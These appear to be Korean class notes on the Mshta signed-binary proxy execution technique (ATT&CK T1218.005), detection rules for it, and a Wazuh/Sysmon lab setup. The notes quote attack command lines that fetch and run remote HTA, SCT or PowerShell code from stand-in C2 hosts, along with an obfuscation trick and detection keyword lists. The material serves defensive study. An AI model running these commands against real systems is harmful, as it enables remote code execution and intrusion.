# [수업 노트] T1218.005 Mshta — 서명된 바이너리 프록시 실행과 탐지 전략

> 원본: 개인 학습 노트(Notion)에서 옮겨 정리. 스크린샷은 📷 표시로 화면 내용을 글로 옮겼습니다.

MSHTA.EXE

- Microsoft 공식 서명 파일 HTA, VBScript, JScript 등을 실행
- 공격자가 보안 솔루션의 서명 기반 탐지와 실행 통제를 우회하는 프록시 실행 도구로 악용된다.
- mshta.exe를 통한 원격 HTA 호출, 레지스트리 은닉 스크립트 실행, 인라인 스크립트 난독화
- MSHTA.EXE가 차단이 된 경우 rundll32.exe와 mshtml.dll의 RunHTMLApplication을 우회 경로로 활용한다.
- 탐지를 위해서는 명령행의 javascript:. vbscript: 프로토콜 또는 RunHTMLApplication 문자열 포함 여부, vbscript.dll, jscript.dll의 비정상 DLL로딩, mshta.exe.의 외부IP연결 시도를 복합적으로 모니터링해야 한다.

> 📷 강의 슬라이드: T1218 Signed Binary Proxy Execution은 서명된 정상 바이너리를 먼저 실행하고 그 기능으로 악성 코드를 실행해 실행 통제를 우회하는 기법. 하위 기법 13개 — .001 Compiled HTML, .002 Control Panel, .003 CMSTP, .004 InstallUtil, .005 Mshta, .006 Msiexec, .007 Odbcconf, .008 Regsvcs/Regasm, .009 Regsvr32, .010 Rundll32, .011 Verclsid, .012 Mavinject, .013 MMC.

> 📷 T1218.005 Mshta: HTA는 HTML+스크립트로 된 실행 형식이고, MS 서명이 된 mshta.exe가 모든 윈도우에 기본 포함돼 javascript/vbscript를 실행할 수 있다. ATT&CK Procedure Examples에 APT29, APT32, APT38(이름 바꾼 mshta), Confucius, Earth Lusca(악성 LNK에서 HTA 로드), FIN7 등이 사용 사례로 나온다.

> 📷 프로시저 예: ① `mshta.exe http://c2_url/evil.hta`(C2에 있는 HTA 실행, 파일 생성됨) ② `mshta "about:<hta:application><script>…regread('HKCU\…\evilscript')…"`(레지스트리에 숨긴 스크립트 실행) ③ `mshta vbscript:Close(Execute("GetObject(""script:https://…/payload.sct"")"))`(프로토콜 핸들러로 vbscript 실행).

> 📷 프로시저 예(계속): 환경 변수 문자열 잘라내기(`%allusersprofile:~8,1%` 등)로 "javascript"를 조립하는 난독화된 mshta 명령, 그리고 `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";…WScript.Shell.Run("powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString(…)")`로 메모리에서만 PowerShell을 실행하는 방법.

> 📷 HKEY_CLASSES_ROOT에서 OLEScript 하위 키를 가진 항목을 찾아 스크립트 엔진 이름·CLSID·DLL 경로를 뽑는 PowerShell 함수 Get-OLEScriptingEngine — 어떤 프로토콜 핸들러가 등록돼 있는지 공격자·분석가 모두 확인할 수 있는 정찰 코드.

> 📷 위 함수 실행 결과: ECMAScript/JavaScript/JScript 계열은 C:\Windows\System32\jscript.dll, VBS/VBScript 계열은 vbscript.dll, XML은 msxml3.dll — 공격에 쓰일 수 있는 스크립트 엔진과 실제 경로 목록.

> 📷 주요 도구 표: 기본 실행체 mshta.exe(부모가 Word·Excel이면 집중 감시), 공격 프레임워크 Metasploit·Koadic(HTA 페이로드로 C2 연결, 외부 IP 80/443 연결), 우회 실행체 rundll32.exe(mshtml.dll의 RunHTMLApplication 직접 호출 → 이름 기반 탐지 무력화), 스크립트 엔진 VBScript/JScript(vbscript.dll·jscript.dll 로딩 감시).

> 📷 도구 간 공통점: mshta.exe와 rundll32.exe 모두 vbscript:/javascript: 프로토콜 핸들러 → COM CLSID 3050F3B2-98B5-11CF-BB82-00AA00BDCE0B(Microsoft HTML Javascript Pluggable Protocol) → COM 서버 mshtml.dll → RunHTMLApplication API로 이어진다.

> 📷 데이터 소스별 탐지 전략: 프로세스 생성(명령행에 mshtml, RunHTMLApplication, javascript:, vbscript:, about: 포함 / 부모가 winword·excel·outlook), 모듈 로드(vbscript·jscript·mshtml.dll 동시 로드), 파일·레지스트리 쓰기(실행 직후 AppData\Local\Temp 파일 생성, schtasks·Run 키에 mshta 등록), 네트워크(외부 IP 80/443 연결, 낯선 도메인·IP 직접 통신은 C2로 간주).

> 📷 주요 공격 특징: 서명된 정상 파일 악용으로 실행 차단 우회, 확장자에 의존하지 않아 문서·이미지로 위장 가능, javascript:/vbscript:/about: 인라인 실행으로 디스크에 파일을 남기지 않음, http/ftp로 원격 페이로드를 바로 실행, 문서에 개체로 임베드되거나 COM으로 측면 이동에도 쓰인다.

> 📷 초크포인트 분석: 공격 성립 조건은 mshta/rundll32 실행 + 명령행 인자 + mshtml.dll 및 스크립트 엔진 DLL 로드. 탐지에 쓸 결과물은 rundll32 인자에 RunHTMLApplication, mshta/rundll32의 아웃바운드 연결, 프로토콜 핸들러 인자, 비정상 부모 프로세스, HTA MIME 불일치, 내부 이미지명과 파일명 불일치, 난독화된 인자, mshtml.dll 로딩(오탐 가능).

> 📷 강의 요약: 기본 탑재 신뢰 바이너리를 쓰므로 단순 차단·파일 기반 탐지로는 막기 어렵다. Metasploit·Koadic과 결합하면 메모리 전용 RAT 로드도 가능. 부모 프로세스·DLL 로딩·네트워크 대상을 함께 보는 다층 규칙과, 레지스트리·스케줄러 지속성 감시가 핵심.


## Mshta.exe 악용 패턴 탐지


## Case1

> 📷 실습 구성도: Kali에서 세 가지 mshta 공격(① `mshta http://c2/evil.hta` ② `mshta about:<script>` 레지스트리 ③ `mshta vbscript:Execute(...)`)을 simulate_attack.sh로 실행 → Windows 10 에이전트(Sysmon Event ID 1, Wazuh Agent 4.9.0) → Wazuh Manager custom_mshta_rules.xml(100001 C2 URL, 100002 레지스트리, 100003 VBScript, 레벨 12~15) → Elasticsearch/Kibana 대시보드. Python 파서(parse_mshta_alerts.py)가 alerts.json을 CSV·통계로 바꿔 Bulk API로 전송. 프로젝트 폴더 mshta-detection/(rules, scripts, dashboard).
